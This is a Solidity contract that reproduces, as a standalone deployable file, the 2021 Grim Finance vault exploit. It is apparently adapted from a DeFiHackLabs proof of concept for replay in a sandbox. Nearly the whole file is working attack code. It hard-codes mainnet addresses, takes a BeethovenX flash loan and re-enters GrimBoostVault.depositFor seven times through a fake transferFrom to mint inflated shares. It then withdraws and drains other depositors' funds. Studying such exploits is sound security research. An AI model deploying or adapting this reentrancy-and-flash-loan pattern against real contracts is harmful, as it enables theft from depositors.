// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-12-Grim).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`attacker = address(this)`; the flash-loan callback `receiveFlashLoan` and the
// reentrancy callback `transferFrom` both live on `ContractTest`). There is no
// standalone contract to deploy. This file is a faithful, self-contained copy of
// that inline attack so the playground can deploy it and record `run()`. Logic,
// constants, and the 7-step reentrancy counter are copied verbatim from
// test/Grim_exp.sol — only the entrypoint was renamed testExploit→run and the
// flash-loan args inlined.
//
// Root cause: GrimBoostVault.depositFor(token, amount, user) mints vault shares
// against a balance snapshot taken BEFORE an untrusted `token.transferFrom(...)`,
// where `token` is caller-controlled. Passing THIS contract as `token` lets the
// attacker re-enter depositFor() repeatedly before any LP actually moves, so each
// reentrant frame mints a fresh tranche of shares against the same stale
// denominator. Withdrawing the inflated shares redeems ~1.39x the LP ever
// deposited, draining other depositors' funds.

// NOTE: interfaces are prefixed (Grim_) to avoid colliding with the registry's
// own interface.sol, which is compiled alongside this file and redeclares
// IERC20 / IPancakePair / etc. with different members.
interface GrimIERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface GrimIWFTM is GrimIERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface GrimIUniswapV2Router {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface GrimIPancakePair {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function burn(address) external returns (uint256 amount0, uint256 amount1);
    function approve(address, uint256) external returns (bool);
}

interface GrimIBeethovenVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface GrimIGrimBoostVault {
    function depositFor(address token, uint256 _amount, address user) external;
    function withdrawAll() external;
}

contract GrimDrain {
    address constant BTC = 0x321162Cd933E2Be498Cd2267a90534A804051b11;
    address constant WFTM = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address constant ROUTER = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52; // SpiritSwap
    address constant BTC_WFTM_PAIR = 0x279b2c897737a50405ED2091694F225D83F2D3bA; // Spirit LP
    address constant BEETHOVEN_VAULT = 0x20dd72Ed959b6147912C2e529F0a0C651c33c9ce; // flash-loan pool
    address constant GRIM_BOOST_VAULT = 0x660184CE8AF80e0B1e5A1172A16168b15f4136bF;

    uint256 constant BTC_LOAN = 30 * 1e8; // 30 anyBTC (8 decimals)
    uint256 constant WFTM_LOAN = 937_830 * 1e18; // 937,830 WFTM
    uint256 constant REENTRANCY_STEPS = 7;

    GrimIWFTM constant wftm = GrimIWFTM(WFTM);
    GrimIERC20 constant btc = GrimIERC20(BTC);
    GrimIUniswapV2Router constant router = GrimIUniswapV2Router(ROUTER);
    GrimIPancakePair constant btcWftm = GrimIPancakePair(BTC_WFTM_PAIR);
    GrimIBeethovenVault constant beethovenVault = GrimIBeethovenVault(BEETHOVEN_VAULT);
    GrimIGrimBoostVault constant grimBoostVault = GrimIGrimBoostVault(GRIM_BOOST_VAULT);

    uint256 reentrancySteps = REENTRANCY_STEPS;
    uint256 lpBalance;

    // step 1: flash-loan WFTM + BTC from BeethovenX; callback does the whole attack.
    function run() external {
        address[] memory loanTokens = new address[](2);
        loanTokens[0] = WFTM;
        loanTokens[1] = BTC;
        uint256[] memory loanAmounts = new uint256[](2);
        loanAmounts[0] = WFTM_LOAN;
        loanAmounts[1] = BTC_LOAN;
        beethovenVault.flashLoan(address(this), loanTokens, loanAmounts, "");
    }

    // Called by BeethovenX after sending the flash-loaned funds.
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) public {
        // step 2: add liquidity to SpiritSwap → mint the LP we will deposit.
        wftm.approve(ROUTER, WFTM_LOAN);
        btc.approve(ROUTER, BTC_LOAN);
        router.addLiquidity(BTC, WFTM, BTC_LOAN, WFTM_LOAN, 0, 0, address(this), block.timestamp);

        // step 3: deposit LP into GrimBoostVault — the reentrancy trigger.
        btcWftm.approve(GRIM_BOOST_VAULT, 2 ** 256 - 1);
        lpBalance = btcWftm.balanceOf(address(this));
        grimBoostVault.depositFor(address(this), lpBalance, address(this));

        // step 6: withdraw the inflated shares.
        grimBoostVault.withdrawAll();

        // step 7: remove liquidity from SpiritSwap at the inflated LP holdings.
        lpBalance = btcWftm.balanceOf(address(this));
        btcWftm.transfer(BTC_WFTM_PAIR, lpBalance);
        btcWftm.burn(address(this));

        // step 8: repay the flash loan (amount + fee).
        for (uint256 i = 0; i < tokens.length; ++i) {
            GrimIERC20(tokens[i]).transfer(BEETHOVEN_VAULT, amounts[i] + feeAmounts[i]);
        }
    }

    // step 4+5: the reentrancy payload — invoked by GrimBoostVault's
    // `token.transferFrom(msg.sender, …)` when `token == address(this)`.
    function transferFrom(address, address, uint256) public {
        reentrancySteps -= 1;
        if (reentrancySteps > 0) {
            // re-enter with token == this contract: no LP moves, denominator stays stale.
            grimBoostVault.depositFor(address(this), lpBalance, address(this));
        } else {
            // innermost level: token == the REAL Spirit LP → the one genuine deposit.
            grimBoostVault.depositFor(BTC_WFTM_PAIR, lpBalance, address(this));
        }
    }
}
